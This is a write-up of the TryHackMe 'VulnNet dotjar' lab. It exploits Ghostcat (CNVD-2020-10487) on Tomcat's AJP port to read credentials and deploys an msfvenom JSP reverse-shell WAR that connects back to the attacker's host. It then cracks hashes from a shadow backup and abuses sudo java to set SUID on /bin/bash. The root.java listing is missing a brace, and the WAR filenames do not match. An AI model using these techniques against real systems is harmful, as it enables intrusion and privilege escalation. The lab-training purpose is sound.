# 72 - VulnNet dotjar (Ghostcat exploit, Java app exploitation)

Room Link --> [https://tryhackme.com/room/vulnnetdotjar](https://tryhackme.com/room/vulnnetdotjar)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV 10.10.23.33

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```
{% endcode %}

Navigating to port 8080

<figure><img src=".gitbook/assets/image (469).png" alt=""><figcaption></figcaption></figure>

None of the default credentials worked for the Manager Login panel.

### Ghostcat Exploit <a href="#ghostcat-exploit" id="ghostcat-exploit"></a>

A quick google search for exploits for `apache tomcat version 9.0.30` and we saw it is vulnerable to the \`[https://github.com/00theway/Ghostcat-CNVD-2020-10487](https://github.com/00theway/Ghostcat-CNVD-2020-10487)\`

We run the script against port 8009

```bash
python3 ajpShooter.py http://10.10.143.34 8009 /WEB-INF/web.xml read
```

We got the credentials:

`webdev : Hgj3LA$02D$Fa@21`&#x20;

We can login on port 8080 now.

<figure><img src=".gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

#### Generating jsp .war reverse shell file with MSFVENOM

Now we have credentials to Apache we can upload a Java based reverse shell. Letâ€™s create one using msfvenom:

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.18.88.214 LPORT=1234 -f war -o pencer-shell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: pencer-shell.war
```
{% endcode %}

We use this [repo](https://gist.github.com/pete911/6111816) to upload it.

```bash
dking@dking ~/Downloads$ curl -u webdev -T reverse.war 'http://10.10.123.106:8080/manager/text/deploy?path=/'
Enter host password for user 'webdev':
FAIL - Application already exists at path [/]

# i keep getting that error, so i just tried some random dir ie; "im"
dking@dking ~/Downloads$ curl -u webdev -T reverse.war 'http://10.10.123.106:8080/manager/text/deploy?path=/war/'
Enter host password for user 'webdev':
OK - Deployed application at context path [/war/]
```

After uploading via command line, visit the URL in browser: `http://10.10.123.106:8080/war`

And i got shell.

<figure><img src=".gitbook/assets/image (471).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

Just like other VulnNet rooms, there is a /backup dir in the /var dir containing a readable `shadow-backup-alt.gz` file. Send it to kali and read it.

And we get a shadow file backup

```bash
dking@dking ~/Downloads$ cat shadow-backup-alt                                                                 
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
daemon:*:18642:0:99999:7:::
bin:*:18642:0:99999:7:::
sys:*:18642:0:99999:7:::
sync:*:18642:0:99999:7:::
games:*:18642:0:99999:7:::
man:*:18642:0:99999:7:::
lp:*:18642:0:99999:7:::
mail:*:18642:0:99999:7:::
news:*:18642:0:99999:7:::
uucp:*:18642:0:99999:7:::
proxy:*:18642:0:99999:7:::
www-data:*:18642:0:99999:7:::
backup:*:18642:0:99999:7:::
list:*:18642:0:99999:7:::
irc:*:18642:0:99999:7:::
gnats:*:18642:0:99999:7:::
nobody:*:18642:0:99999:7:::
systemd-network:*:18642:0:99999:7:::
systemd-resolve:*:18642:0:99999:7:::
syslog:*:18642:0:99999:7:::
messagebus:*:18642:0:99999:7:::
_apt:*:18642:0:99999:7:::
uuidd:*:18642:0:99999:7:::
lightdm:*:18642:0:99999:7:::
whoopsie:*:18642:0:99999:7:::
kernoops:*:18642:0:99999:7:::
pulse:*:18642:0:99999:7:::
avahi:*:18642:0:99999:7:::
hplip:*:18642:0:99999:7:::
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::

```

Using john to crack the shadow hashes.

```bash
john shadow-backup-alt --wordlist=/usr/share/wordlists/rockyou.txt

# we cracked "jdk-admin"
794613852        (jdk-admin)     
```

We are able to `su jdk-admin` .

<figure><img src=".gitbook/assets/image (472).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Root

`sudo -l` .

<figure><img src=".gitbook/assets/image (473).png" alt=""><figcaption></figcaption></figure>

Running sudo -l we see that the user jdk-admin can run any jar file as the root user.

#### 1. Creating and Executing Jar file to read root flag.txt

[Create and execute java files](https://www.tecmint.com/create-and-execute-jar-file-in-linux/)

Create `Exploit.java` file, which reads the **root.txt** from the root directory.

```java
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;

public class Exploit {
  public static void main(String[] args) {
    try {
      File myObj = new File("/root/root.txt");
      Scanner myReader = new Scanner(myObj);
      while (myReader.hasNextLine()) {
        String data = myReader.nextLine();
        System.out.println(data);
      }
      myReader.close();
    } catch (FileNotFoundException e) {
      System.out.println("An error occurred.");
      e.printStackTrace();
    }
  }
}
```

Executing Jar file, but it gives an error due to the absence of **manifest attribute**.

```bash
jdk-admin@vulnnet-dotjar:~/Downloads$ javac -d . Exploit.java
jdk-admin@vulnnet-dotjar:~/Downloads$ ls
Exploit.class  Exploit.java
jdk-admin@vulnnet-dotjar:~/Downloads$ jar cvf exploit.jar Exploit.class
added manifest
adding: Exploit.class(in = 865) (out= 563)(deflated 34%)
jdk-admin@vulnnet-dotjar:~/Downloads$ ls
Exploit.class  exploit.jar  Exploit.java
jdk-admin@vulnnet-dotjar:~/Downloads$ sudo java -jar exploit.jar
Password: 
no main manifest attribute, in exploit.jar
```

Adding **manifest attribute** and then executing the exploit:

```bash
jdk-admin@vulnnet-dotjar:~/Downloads$ echo Main-Class: Exploit > MANIFEST.MF
jdk-admin@vulnnet-dotjar:~/Downloads$ jar cvmf MANIFEST.MF exploit.jar Exploit.class
added manifest
adding: Exploit.class(in = 865) (out= 563)(deflated 34%)
jdk-admin@vulnnet-dotjar:~/Downloads$ sudo java -jar exploit.jar
THM{464c29e3ffae05c2e67e6f0c5064759c}
jdk-admin@vulnnet-dotjar:~/Downloads$ 
```

#### 2. Getting root shell using java

```java
jdk-admin@vulnnet-dotjar:/dev/shm$ cat <<EOF >>root.java 
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;

public class root {
    public static void main(String[] args) {
        String command = "chmod +s /bin/bash";
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
EOF
```

Now we need to compile it:

```
jdk-admin@vulnnet-dotjar:/dev/shm$ javac root.java
jdk-admin@vulnnet-dotjar:/dev/shm$ jar cfe root.jar root root.class
```

Then we can run our code to change bash permissions:

```
jdk-admin@vulnnet-dotjar:/dev/shm$ sudo -u root /usr/bin/java -jar root.jar
```

Finally we run bash and escalate to root to get the last flag:

```
jdk-admin@vulnnet-dotjar:/dev/shm$ bash -p
bash-4.4# cat /root/root.txt
```

Done!

